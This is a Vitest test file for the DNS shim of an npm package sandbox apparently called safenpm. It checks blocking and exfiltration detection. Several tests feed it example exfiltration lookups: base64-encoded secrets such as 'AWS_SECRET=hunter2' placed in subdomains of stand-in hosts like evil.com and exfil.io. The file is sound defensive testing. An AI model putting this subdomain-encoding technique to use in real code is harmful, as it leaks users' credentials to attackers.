/**
 * dns-shim.test.ts
 *
 * Tests for src/enforcer/shims/dns.shim.ts
 *
 * DNS is the sneaky exfiltration channel: data is encoded in subdomain
 * labels and sent via DNS lookups rather than HTTP requests.
 * We must block all DNS when outbound: false, and detect exfil patterns
 * even when outbound is allowed.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import { createDnsShim } from '../../src/enforcer/shims/dns.shim'
import type { PackageCapability, Violation } from '../../src/capabilities/schema'

const noNetProfile: PackageCapability = {
  version: '1.0.0',
  fs: { read: [], write: [] },
  net: { outbound: false, hosts: [] },
  env: [],
  child_process: { allowed: false },
  worker_threads: false,
  hasNativeModules: false,
  approvedBy: 'user',
  approvedAt: '2026-01-01T00:00:00Z',
}

const netAllowedProfile: PackageCapability = {
  ...noNetProfile,
  net: { outbound: true, hosts: ['*'] },
}

function makeMockDns(): Record<string, ReturnType<typeof vi.fn>> {
  return {
    lookup: vi.fn((hostname, callback) => callback?.(null, '1.2.3.4', 4)),
    resolve: vi.fn(),
    resolve4: vi.fn(),
    resolve6: vi.fn(),
    resolveMx: vi.fn(),
    resolveTxt: vi.fn(),
    resolveSrv: vi.fn(),
    resolveNs: vi.fn(),
    resolveCname: vi.fn(),
  }
}

describe('dns shim — blocked when no net permission', () => {
  let violations: Violation[]
  let mockDns: ReturnType<typeof makeMockDns>
  let shim: ReturnType<typeof makeMockDns>

  beforeEach(() => {
    violations = []
    mockDns = makeMockDns()
    shim = createDnsShim(mockDns, noNetProfile, 'lodash', v => violations.push(v)) as typeof mockDns
  })

  it('lookup() throws when outbound: false', () => {
    expect(() => shim.lookup('api.github.com')).toThrow('[safenpm] BLOCKED')
    expect(mockDns.lookup).not.toHaveBeenCalled()
  })

  it('logs HIGH severity and correct reason', () => {
    try { shim.lookup('api.github.com') } catch { /* expected */ }
    expect(violations[0].severity).toBe('HIGH')
    expect(violations[0].reason).toBe('DNS_BLOCKED_NO_NET_PERMISSION')
    expect(violations[0].blocked).toBe(true)
  })

  it('resolve() throws when outbound: false', () => {
    expect(() => shim.resolve('example.com')).toThrow('[safenpm] BLOCKED')
  })

  it('resolveMx() throws when outbound: false', () => {
    expect(() => shim.resolveMx('example.com')).toThrow('[safenpm] BLOCKED')
  })

  it('resolveTxt() throws when outbound: false', () => {
    expect(() => shim.resolveTxt('example.com')).toThrow('[safenpm] BLOCKED')
  })

  it('resolveSrv() throws when outbound: false', () => {
    expect(() => shim.resolveSrv('_http._tcp.example.com')).toThrow('[safenpm] BLOCKED')
  })

  it('resolveNs() throws when outbound: false', () => {
    expect(() => shim.resolveNs('example.com')).toThrow('[safenpm] BLOCKED')
  })

  it('resolveCname() throws when outbound: false', () => {
    expect(() => shim.resolveCname('www.example.com')).toThrow('[safenpm] BLOCKED')
  })
})

describe('dns shim — exfiltration detection (even when net allowed)', () => {
  let violations: Violation[]
  let mockDns: ReturnType<typeof makeMockDns>
  let shim: ReturnType<typeof makeMockDns>

  beforeEach(() => {
    violations = []
    mockDns = makeMockDns()
    shim = createDnsShim(mockDns, netAllowedProfile, 'analytics-pkg', v => violations.push(v)) as typeof mockDns
  })

  it('blocks lookup with base64-encoded subdomain (exfil attempt)', () => {
    const encoded = Buffer.from('AWS_SECRET=hunter2').toString('base64')
    expect(() => shim.lookup(`${encoded}.evil.com`)).toThrow('[safenpm] BLOCKED')
    expect(mockDns.lookup).not.toHaveBeenCalled()
  })

  it('logs CRITICAL severity for DNS exfiltration', () => {
    const encoded = Buffer.from('stolen credentials').toString('base64')
    try { shim.lookup(`${encoded}.exfil.io`) } catch { /* expected */ }
    expect(violations[0].severity).toBe('CRITICAL')
    expect(violations[0].reason).toBe('DNS_EXFILTRATION_ATTEMPT')
    expect(violations[0].blocked).toBe(true)
  })

  it('blocks lookup with hex-encoded subdomain', () => {
    expect(() => shim.lookup('deadbeefdeadbeef1234567890abcdef.evil.com')).toThrow('[safenpm] BLOCKED')
  })

  it('blocks lookup with suspiciously long subdomain label', () => {
    const long = 'a'.repeat(33)
    expect(() => shim.lookup(`${long}.evil.com`)).toThrow('[safenpm] BLOCKED')
  })

  it('allows lookup with legitimate hostname', () => {
    shim.lookup('api.github.com')
    expect(mockDns.lookup).toHaveBeenCalledWith('api.github.com')
    expect(violations).toHaveLength(0)
  })

  it('allows resolve for npm registry', () => {
    shim.resolve('registry.npmjs.org')
    expect(mockDns.resolve).toHaveBeenCalled()
    expect(violations).toHaveLength(0)
  })
})

describe('dns shim — null profile', () => {
  it('blocks all DNS for unregistered package', () => {
    const mockDns = makeMockDns()
    const violations: Violation[] = []
    const shim = createDnsShim(mockDns, null, 'unknown', v => violations.push(v)) as typeof mockDns
    expect(() => shim.lookup('example.com')).toThrow('[safenpm] BLOCKED')
    expect(violations[0].reason).toBe('NO_CAPABILITY_PROFILE')
  })
})
